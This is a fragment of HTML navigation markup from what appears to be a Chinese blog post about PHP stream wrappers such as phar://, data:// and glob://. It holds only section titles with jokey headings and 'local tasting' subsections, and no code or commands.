<span class="nav-text">本地试吃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#phar-%E2%80%94-%E6%9C%89%E5%9F%BA%E4%BD%AC%E5%BC%80%E6%88%91%E8%A3%A4%E9%93%BE"><span class="nav-number">2.4.</span> <span class="nav-text">phar:&#x2F;&#x2F; — 有基佬开我裤链</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%95%E5%90%83-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">本地试吃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#data-%E2%80%94-%E7%9A%87%E5%86%9B%E6%89%98%E6%88%91%E7%BB%99%E6%82%A8%E5%B8%A6%E4%B8%AA%E8%AF%9D"><span class="nav-number">2.5.</span> <span class="nav-text">data:&#x2F;&#x2F; — 皇军托我给您带个话</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%95%E5%90%83-4"><span class="nav-number">2.5.1.</span> <span class="nav-text">本地试吃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#glob-%E2%80%94-%E6%88%91%E6%9D%A5%E4%BA%86%E5%B0%B1%E6%98%AF%E6%9F%A5%E5%AF%9D%E6%9D%A5%E4%BA%86"><span class="nav-number">2.6.</span> <span class="nav-text">glob:&#x2F;&#x2F; — 我来了就是查寝来了</span></a></li></ol></li></ol></div>
             
 
           </div>
